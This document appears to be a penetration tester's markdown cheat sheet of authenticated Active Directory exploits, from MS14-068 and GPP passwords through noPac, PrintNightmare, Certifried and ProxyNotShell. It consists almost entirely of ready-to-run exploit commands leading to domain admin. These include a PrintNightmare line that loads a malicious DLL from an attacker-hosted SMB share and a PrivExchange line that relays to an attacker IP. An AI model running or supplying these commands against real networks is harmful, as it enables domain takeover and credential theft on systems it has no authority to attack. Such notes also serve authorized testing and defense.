# Know vulnerabilities authenticated

## MS14-068 >>> PTT >>> Domain admin || Admin
- `findSMB2UPTime.py <ip>`
  - `ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>`
  - `msf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum`
  - `goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@target`

## GPP MS14-025 >>> Domain admin
- `msf> use auxiliary/scanner/smb/smb_enum_gpp`
- `findstr /S /I cpassword \\<domain_fqdn>\sysvol\<domain_fqdn>\policies\*.xml`
- `Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>`

## PrivExchange (CVE-2019-0724, CVE-2019-0686) >>> HTTP Coerce >>> Domain admin || Admin
- `privexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>`

## noPac (CVE-2021-42287, CVE-2021-42278) >>> PTT >>> DCSYNC >>> Domain admin
- `nxc smb <ip> -u 'user' -p 'pass' -M nopac #scan`
- `noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> /service cifs /ptt`

## PrintNightmare (CVE-2021-1675, CVE-2021-34527) >>> Admin
- `nxc smb <ip> -u 'user' -p 'pass' -M printnightmare #scan`
- `printnightmare.py -dll '\\<attacker_ip>\smb\add_user.dll' '<user>:<password>@<ip>'`

## Certifried (CVE-2022-26923) >>> PTT >>> DCSYNC >>> Domain admin
- Create account
  - `certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>'`
- Request
  - `certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine`
- Authentication
  - `certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>`

## ProxyNotShell (CVE-2022-41040, CVE-2022-41082) >>> Admin
- `poc_aug3.py <host> <username> <password> <command>`